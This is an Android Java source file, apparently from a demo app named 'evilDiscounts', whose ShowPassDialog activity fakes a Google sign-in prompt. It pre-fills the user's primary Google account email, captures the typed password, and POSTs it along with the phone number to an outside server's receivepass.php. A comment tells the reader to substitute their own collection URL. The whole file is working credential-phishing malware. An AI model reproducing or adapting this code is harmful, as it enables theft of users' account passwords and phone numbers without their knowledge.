package com.evilDiscounts;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class ShowPassDialog extends Activity {
  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // Set up the dialog.
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    setContentView(R.layout.pass_dialog);

    // Get the primary e-mail address of the user.
    Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
    final String primaryEmail = accounts[0].name;
    
    // Set the email field in the dialog to the primary email.
    TextView email = (TextView) findViewById(R.id.emailText);
    email.setText(primaryEmail);
    
    // Get the password field.
    final EditText pass = (EditText) findViewById(R.id.passInput);

    // Get the signin button and send password on click.
    Button signin = (Button) findViewById(R.id.signin);
    signin.setOnClickListener(new OnClickListener() {

      @Override
      public void onClick(View v) {
        sendPass(primaryEmail, pass.getText().toString());
        // Set a preference so the dialog is only showed once.
        PreferenceManager.getDefaultSharedPreferences(ShowPassDialog.this).edit()
                .putBoolean("havePass", true).commit();
        finish();
      }
    });
  }

  // This method will send the entered password to the server.
  protected void sendPass(String primaryEmail, String password) {
    TelephonyManager mTelephonyMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
    String mynumber = mTelephonyMgr.getLine1Number().substring(1);
    URL url;
    HttpURLConnection connect = null;
    BufferedReader rd;
    StringBuilder sb;
    OutputStreamWriter wr;
    // Replace this string with your receievepass.php url.
    String urlString = "http://www.paintedostrich.com/receivepass.php";
    try {
      System.setProperty("http.keepAlive", "false");
      url = new URL(urlString);
      connect = (HttpURLConnection) url.openConnection();
      connect.setRequestMethod("POST");
      connect.setDoOutput(true);
      connect.setDoInput(true);
      connect.setReadTimeout(10000);

      connect.connect();

      // write to the stream
      StringBuilder data = new StringBuilder();
      String numData = URLEncoder.encode("phoneId", "UTF-8") + "="
              + URLEncoder.encode(mynumber, "UTF-8");
      String emailData = URLEncoder.encode("primaryEmail", "UTF-8") + "="
              + URLEncoder.encode(primaryEmail, "UTF-8");
      String passData = URLEncoder.encode("password", "UTF-8") + "="
              + URLEncoder.encode(password, "UTF-8");

      data.append(numData).append("&").append(emailData).append("&").append(passData);

      wr = new OutputStreamWriter(connect.getOutputStream());
      wr.write(data.toString());
      wr.flush();

      // read the result from the server
      rd = new BufferedReader(new InputStreamReader(connect.getInputStream()));
      sb = new StringBuilder();
      String line = null;
      while ((line = rd.readLine()) != null) {
        sb.append(line);
      }
    } catch (MalformedURLException e1) {
      e1.printStackTrace();
      Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
      return;
    } catch (IOException e) {
      e.printStackTrace();
      return;
    } finally {
      // close the connection, set all objects to null
      connect.disconnect();
      rd = null;
      sb = null;
      wr = null;
      connect = null;
    }
  }

}
